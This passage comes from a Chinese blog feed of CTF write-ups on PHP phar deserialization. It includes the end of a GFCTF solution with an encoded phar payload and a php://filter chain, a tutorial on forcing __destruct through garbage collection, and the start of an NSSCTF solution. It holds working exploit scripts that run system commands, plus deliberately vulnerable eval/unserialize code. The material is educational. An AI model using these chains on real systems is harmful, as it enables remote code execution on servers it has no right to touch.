?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;aaaaaaatest&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成<code>phar</code>文件之后，把后面的<code>i:1</code>改成<code>i:0</code>，这里有个坑点就是不能在记事本里面直接改，直接改后面打不出来，也挺离谱的，得放到<code>winhex</code>里面去改十六进制就行</p><p><img src="https://i.loli.net/2021/11/29/e4p73WRYbfEic9d.png" alt="image.png"></p><p>改完之后就是去修改签名，由于它也是<code>sha1</code>加密，所以说去跑上次那个修改签名的脚本就行了，直接手动跑出签名填上也行，然后就是去跑那个加密脚本，得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=00R=000=00l=00G=00O=00D=00l=00h=00P=00D=009=00w=00a=00H=00A=00g=00X=001=009=00I=00Q=00U=00x=00U=00X=000=00N=00P=00T=00V=00B=00J=00T=00E=00V=00S=00K=00C=00k=007=00I=00D=008=00+=00D=00Q=00q=00N=00A=00Q=00A=00A=00A=00Q=00A=00A=00A=00B=00E=00A=00A=00A=00A=00B=00A=00A=00A=00A=00A=00A=00B=00X=00A=00Q=00A=00A=00Y=00T=00o=00y=00O=00n=00t=00p=00O=00j=00A=007=00T=00z=00o=000=00O=00i=00J=00V=00c=002=00V=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00g=006=00I=00n=00V=00z=00Z=00X=00J=00u=00Y=00W=001=00l=00I=00j=00t=00P=00O=00j=00c=006=00I=00k=001=005=00Z=00X=00J=00y=00b=003=00I=00i=00O=00j=00I=006=00e=003=00M=006=00N=00z=00o=00i=00b=00W=00V=00z=00c=002=00F=00n=00Z=00S=00I=007=00T=00z=00o=001=00O=00i=00J=00G=00a=00W=00x=00l=00c=00y=00I=006=00M=00j=00p=007=00c=00z=00o=004=00O=00i=00J=00m=00a=00W=00x=00l=00b=00m=00F=00t=00Z=00S=00I=007=00T=00j=00t=00z=00O=00j=00M=006=00I=00m=00F=00y=00Z=00y=00I=007=00c=00z=00o=003=00O=00i=00J=00j=00Y=00X=00Q=00g=00L=002=00Y=00q=00I=00j=00t=009=00c=00z=00o=000=00O=00i=00J=000=00Z=00X=00N=000=00I=00j=00t=00z=00O=00j=00Y=006=00I=00n=00N=005=00c=003=00R=00l=00b=00S=00I=007=00f=00X=00M=006=00O=00D=00o=00i=00c=00G=00F=00z=00c=003=00d=00v=00c=00m=00Q=00i=00O=002=00E=006=00M=00j=00p=007=00a=00T=00o=00w=00O=000=008=006=00N=00D=00o=00i=00V=00X=00N=00l=00c=00i=00I=006=00M=00T=00p=007=00c=00z=00o=004=00O=00i=00J=001=00c=002=00V=00y=00b=00m=00F=00t=00Z=00S=00I=007=00T=00z=00o=003=00O=00i=00J=00N=00e=00W=00V=00y=00c=00m=009=00y=00I=00j=00o=00y=00O=00n=00t=00z=00O=00j=00c=006=00I=00m=001=00l=00c=003=00N=00h=00Z=002=00U=00i=00O=000=008=006=00N=00T=00o=00i=00R=00m=00l=00s=00Z=00X=00M=00i=00O=00j=00I=006=00e=003=00M=006=00O=00D=00o=00i=00Z=00m=00l=00s=00Z=00W=005=00h=00b=00W=00U=00i=00O=000=004=007=00c=00z=00o=00z=00O=00i=00J=00h=00c=00m=00c=00i=00O=003=00M=006=00N=00z=00o=00i=00Y=002=00F=000=00I=00C=009=00m=00K=00i=00I=007=00f=00X=00M=006=00N=00D=00o=00i=00d=00G=00V=00z=00d=00C=00I=007=00c=00z=00o=002=00O=00i=00J=00z=00e=00X=00N=000=00Z=00W=000=00i=00O=003=001=009=00a=00T=00o=00x=00O=003=00M=006=00N=00T=00o=00i=00Y=002=00h=00l=00Y=002=00s=00i=00O=003=001=009=00a=00T=00o=00w=00O=000=004=007=00f=00Q=00g=00A=00A=00A=00B=000=00Z=00X=00N=000=00L=00n=00R=004=00d=00A=00s=00A=00A=00A=00C=00L=001=006=00R=00h=00C=00w=00A=00A=00A=00N=00v=00G=00o=00S=00C=002=00A=00Q=00A=00A=00A=00A=00A=00A=00A=00G=00F=00h=00Y=00W=00F=00h=00Y=00W=00F=000=00Z=00X=00N=000=006=00O=00q=00P=00c=004=00H=00F=00K=009=00m=00B=003=00b=00p=00Q=00s=00r=005=00Y=00g=00y=004=00x=00o=00L=00Y=00C=00A=00A=00A=00A=00R=000=00J=00N=00Q=00g=00=3D=00=3D</span><br></pre></td></tr></table></figure><h2 id="开冲"><a href="#开冲" class="headerlink" title="开冲"></a>开冲</h2><p>接下来就去打了，这里还有最后一个坑点，我们来讲，为了看出这个坑点，过滤器我们一个一个的用，就不一次直接用三个了：</p><p><img src="https://i.loli.net/2021/11/29/QH5qaDEk8AYrFdt.png" alt="image.png"></p><p>首先把payload传上去，然后打第一个过滤器：<code>php://filter/write=convert.quoted-printable-decode/resource=log/error.txt</code></p><p><img src="https://i.loli.net/2021/11/29/M3S2chO8IEVaY9k.png" alt="image.png"></p><p>这里看不出有啥问题，接着打第二个：<code>php://filter/write=convert.iconv.ucs-2.utf8/resource=log/error.txt</code></p><p><img src="https://i.loli.net/2021/11/29/oM9hWC6dxYjUDZJ.png" alt="image.png"></p><p>打完之后发现这个末尾是有两个<code>=</code>号的，然后我们打第三个：<code>php://filter/write=convert.base64-decode/resource=log/error.txt</code></p><p><img src="https://i.loli.net/2021/11/29/E9KxOJMRwmf3qYX.png" alt="image.png"></p><p>好家伙，打完之后发现就只有一个<code>=</code>号了，还有一个奇怪的字符，就离谱，这肯定是打不出来的，至于为啥我也不太清楚，为了补回那个等号，说我们得把<code>payload</code>末尾的<code>=00=3D</code>再写一遍，让这个<code>=</code>正常露出来就行了，改好<code>payload</code>之后先清空日志文件，然后将新的<code>payload</code>传进去，然后直接三个过滤器连在一起用就行了，最后<code>phar://log/error.txt</code>触发即可：</p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt</code></p><p><img src="https://i.loli.net/2021/11/29/beyIm2cXwLDVQKh.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;解析GFCTF—文件查看器&quot;&gt;&lt;a href=&quot;#解析GFCTF—文件查看器&quot; class=&quot;headerlink&quot; title=&quot;解析GFCTF—文件查看器&quot;&gt;&lt;/a&gt;解析GFCTF—文件查看器&lt;/h1&gt;&lt;p&gt;之前那篇文章写了&lt;code&gt;GC&lt;/code&gt;回收机制与&lt;code&gt;phar&lt;/code&gt;反序列化，正好校赛中就有一道这种类型的题，那么我们就来详细聊聊这道题，这道题在比赛的时候是零解，它需要的其它知识点会在文章中慢慢介绍&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://arsenetang.github.io/tags/ctf/"/>
    
    <category term="Web安全" scheme="https://arsenetang.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="wp" scheme="https://arsenetang.github.io/tags/wp/"/>
    
    <category term="php" scheme="https://arsenetang.github.io/tags/php/"/>
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>浅析GC回收机制与phar反序列化</title>
    <link href="https://arsenetang.github.io/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://arsenetang.github.io/2021/11/28/%E6%B5%85%E6%9E%90GC%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E4%B8%8Ephar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-11-27T16:00:00.000Z</published>
    <updated>2021-11-28T08:58:51.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="浅析GC回收机制与phar反序列化"><a href="#浅析GC回收机制与phar反序列化" class="headerlink" title="浅析GC回收机制与phar反序列化"></a>浅析GC回收机制与phar反序列化</h1><p>前段时间做<code>Xenny</code>师傅的平台NSSCTF遇到了一道利用<code>GC</code>回收机制，实现<code>phar</code>反序列化的题，然后上周我们学校举办的校赛<code>GFCTF</code>同样遇到了一道考点相似的题，那道题还要更难一点，要配合多种<code>filter</code>过滤器来吃掉脏数据，不过原理是差不多的；后面会专门写一篇文章来解析那道题</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我们先来看看下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">file_put_contents(<span class="string">&quot;a.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是很简单的一个的一个反序列化，唯一的难点就是怎么把完整的<code>phar</code>文件通过<code>file_put_contents</code>上传上去，写入到<code>a.txt</code>中，说实话这个问题困扰了我挺久的，用了很多种网上的方法也都不太行，因为我们都知道一个<code>phar</code>文件中有大量不可见的字符，肯定是没办法直接cv复制粘贴的，然后我也试过先将它<code>url</code>编码之后再复制粘贴上去，但还是不行，不知道是为什么，我也对比过他们前后的16进制文件，确实是存在一些细微的差别，可能就是因为这个让它无法正常解析，经过不懈尝试后，我发现用<code>python</code>先读取文件再发包是可以的，我们先来把生成<code>phar</code>文件的<code>exp</code>写了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;arsenetang.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;aaaaaaatest&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后就是通过<code>python</code>发包将这个<code>arsenetang.phar</code>文件上传上去并且触发<code>phar</code>反序列化了，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://x.xx.xx.xxx:7676/test.php&#x27;</span></span><br><span class="line">res = requests.post(</span><br><span class="line">    url,</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;phar://a.txt&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="built_in">open</span>(<span class="string">&#x27;./arsenetang.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">) <span class="comment"># 写入并触发</span></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/26/g8TeSnwIatZCkDd.png" alt="image.png"></p><h2 id="PHP-Garbage-collection机制"><a href="#PHP-Garbage-collection机制" class="headerlink" title="PHP Garbage collection机制"></a>PHP Garbage collection机制</h2><p>上面那种情况之所以可以成功，是因为程序在正常结束的时候自动触发了<code>__destruct()</code>，进而执行了<code>__destruct()</code>中的代码；那么假如由于种种原因，程序不能正常结束，那我们还有没有办法能让它触发<code>__destruct()</code>呢？</p><p>这里就要提到我们本文的主人公了，在PHP中，是拥有垃圾回收机制<code>Garbage collection</code>的，也就是我们常说的<code>GC</code>机制的，在PHP中使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为<code>NULL</code>，或者没有任何指针指向时，它就会被变成垃圾，被<code>GC</code>机制自动回收掉；那么当一个对象<strong>没有了任何引用之后</strong>，就会被回收，在回收过程中，就会自动调用对象中的<code>__destruct()</code>，我们可以去官方文档中查询：<a href="https://www.php.net/manual/zh/features.gc.collecting-cycles.php">https://www.php.net/manual/zh/features.gc.collecting-cycles.php</a>，重点内容如下图：</p><p><img src="https://i.loli.net/2021/11/26/PtmhW5eOdaDVTnp.png" alt="image.png"></p><p>那接下来我们就在代码中来看看<code>GC</code>机制实际上是怎么工作的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">obj</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$i</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;i = <span class="variable">$i</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;i.<span class="string">&quot;Create...&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;i.<span class="string">&quot;Destroy...&quot;</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> obj(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> obj(<span class="string">&#x27;2&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> obj(<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;---------------------------&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//整个程序运行结束之后会销毁所有对象，自然会触发__destruct</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以先猜猜这段代码的运行结果，对象1被创建之后由于没有任何的引用，那么它立即就会被<code>GC</code>回收机制回收掉，从而立即进入到<code>__destruct()</code>中；然后新建一个对象2，并将它赋值给<code>$a</code>，那么现在它是正常的，有引用的；但是这时又新建了一个对象3，并将它赋值给了<code>$a</code>，那么这个时候对象2就没有引用了，那么它就会立即被销毁；最后整个程序正常运行结束，销毁所有对象，于是也就销毁了对象3，根据分析，运行结果应该如下：</p><p><img src="https://i.loli.net/2021/11/26/nroM3pd1HjKfCgR.png" alt="image.png"></p><h2 id="GC在phar反序列化中实际运用"><a href="#GC在phar反序列化中实际运用" class="headerlink" title="GC在phar反序列化中实际运用"></a>GC在phar反序列化中实际运用</h2><p>在了解了<code>GC</code>回收机制之后，我们知道了当一个对象失去了引用之后，它就会被当成垃圾回收掉，那么这跟phar反序列化有什么关系呢，我们再来看看下面这段代码，跟第一次相比只是多了一个异常退出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">file_put_contents(<span class="string">&quot;a.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;这不合理&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>别看只加了一句话，我们利用的难度瞬间就加大了，因为有了这一句异常退出以后，程序不再是正常退出的了，不是正常退出就不会触发<code>__destruct()</code>了，那我们自然也就无法直接利用了；所以说我们得想个办法让它提前进入到<code>__destruct()</code>中，也就是让这个对象提前被回收掉，这时候我们就想到GC回收机制了，我们可以先将这个对象赋值给一个变量，然后再将另外一个值赋值给这个变量，这时候这个对象就失去了引用，那么它就会立即被回收掉了，利用数组试着实现它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>[] = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>[] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;arsenetang.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; startBuffering();</span><br><span class="line"><span class="variable">$phar</span> -&gt; setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;aaaaaaatest&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先看看它生成的<code>phar</code>文件长什么样：</p><p><img src="https://i.loli.net/2021/11/26/hg46KtGQOlLJyEW.png" alt="image.png"></p><p>那么假如我们把前面的<code>i:1</code>改为<code>i:0</code>，那么前面那个对象就会由于失去了引用，从而被<code>GC</code>回收机制自动回收掉，但这时又会引发一个新的问题，由于我们是后面自己去改的数据，而它<code>phar</code>文件的签名是第一次生成文件的时候自动生成的，那么当我们修改数据过后，由于签名错误，那么这个<code>phar</code>文件就会被当成是一个损坏的<code>phar</code>文件，是无法被正常解析的，所以就得想个办法重新生成正确的<code>phar</code>文件，我们来先看看一个<code>phar</code>文件的签名的格式：</p><p><img src="https://i.loli.net/2021/11/26/9fON3My8jeCaSRm.png" alt="image.png"></p><p>可以看到，最后四个字节固定是<code>GBMB</code>，然后再往前四个字节是⽤来指定签名的算法，可能是<code>MD5、SHA1、SHA256、SHA512</code>，默认是<code>SHA1</code>，长度为20个字节，所以说签名部分就是末尾的28个字节，那我们去掉末尾的28个字节，再利用<code>sha1</code>算法对文件进行加密，就可以得到正确的签名了，这里我就抄<code>Xenny</code>师傅的修改签名的脚本了，当然我们也可以手动补全签名</p><p><img src="https://i.loli.net/2021/11/26/TPeRxahwrCXSmcN.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;arsenetang.phar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">text = file[:-<span class="number">28</span>]  <span class="comment">#读取开始到末尾除签名外内容</span></span><br><span class="line"></span><br><span class="line">last = file[-<span class="number">8</span>:]   <span class="comment">#读取最后8位的GBMB和签名flag</span></span><br><span class="line"></span><br><span class="line">new_file = text+sha1(text).digest() + last  <span class="comment">#生成新的文件内容，主要是此时sha1正确了。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;arsenetang2.phar&quot;</span>,<span class="string">&quot;wb&quot;</span>).write(new_file)</span><br></pre></td></tr></table></figure><p>那我们首先修改序列化的字符串，再放入脚本中生成签名正确的<code>phar</code>文件就好了，然后我们还是用一样的方法利用脚本将<code>phar</code>文件写进<code>a.txt</code>，再触发就行了</p><p><img src="https://i.loli.net/2021/11/26/5bCE3sqi4xH2pZt.png" alt="image.png"></p><p>可以看到虽然它确实是异常退出了，并且输出了这不合理，不过在退出之前它就已经触发了<code>__destruct()</code>，成功反序列化</p><h2 id="例题解析-—-NSSCTF-prize-p1"><a href="#例题解析-—-NSSCTF-prize-p1" class="headerlink" title="例题解析 — NSSCTF prize_p1"></a>例题解析 — NSSCTF prize_p1</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getflag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$config</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents(<span class="string">&quot;./tmp/a.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;config == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;那么就从这里开始起航吧&quot;</span>);</span><br></pre></td></tr></table></figure><p>有了前面的基础，我想这道题已经比较容易了，这里唯一的难点就是过滤了一些危险字符串，而我们传入的<code>phar</code>文件中肯定是存在<code>flag</code>字符的，所以说我们需要绕过它，在这篇文章中：<a href="https://guokeya.github.io/post/uxwHLckwx/">https://guokeya.github.io/post/uxwHLckwx/</a>，我们可以得知，当一个<code>phar</code>文件被<code>gzip、bzip2、tar、zip</code>等操作过后，依然可以利用<code>phar://</code>协议来正常读取，但文件被操作过后就全变成乱码了，利用这个就可以绕过过滤，接下来我们来构造exp，首先是写入文件的exp，这个很简单，要读的时候改成<code>r</code>就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$config</span>=<span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span 